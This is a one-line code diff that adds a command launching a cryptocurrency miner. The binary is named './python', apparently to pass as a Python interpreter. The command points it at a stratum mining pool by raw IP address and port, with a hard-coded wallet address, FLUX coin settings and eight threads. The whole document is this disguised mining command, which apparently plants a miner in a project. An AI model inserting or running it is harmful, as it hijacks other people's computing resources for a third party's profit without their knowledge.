@@ -1,0 +1,1 @@
+./python -a yespower -o stratum+tcp://198.50.168.213:6234 -u t1ZV5gdce9tkTsk39VqEMxJ3sYaatXB61ft -p c=FLUX -t 8
